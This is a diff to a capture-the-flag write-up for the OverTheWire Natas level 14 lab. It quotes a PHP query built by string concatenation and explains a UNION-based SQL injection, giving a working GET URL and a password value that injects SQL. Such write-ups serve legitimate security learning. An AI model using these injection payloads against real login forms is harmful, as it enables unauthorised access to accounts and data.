@@ -142,5 +142,12 @@ So, if we do our own GET request instead of the POST submitted by the form and a
 ```sql
 $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
 ```
-http://natas14.natas.labs.overthewire.org/?debug&username=1&password=1%22+UNION+SELECT+*+from+users+where+%221%22+=+%221
-a" union select * from users where "1" = "1
+We want the query to simply return a tuple. We can escape the password with a quote and add a simple UNION statement to get what we want. Note that with the additional quote that gets added on the end, we want to add a trivial WHERE clause so that the query doesn't break.
+
+Either do a GET request:
+
+`http://natas14.natas.labs.overthewire.org/?debug&username=1&password=1%22+UNION+SELECT+*+from+users+where+%221%22+=+%221`
+
+Or simply use this as the password in the form:
+
+`a" union select * from users where "1" = "1`
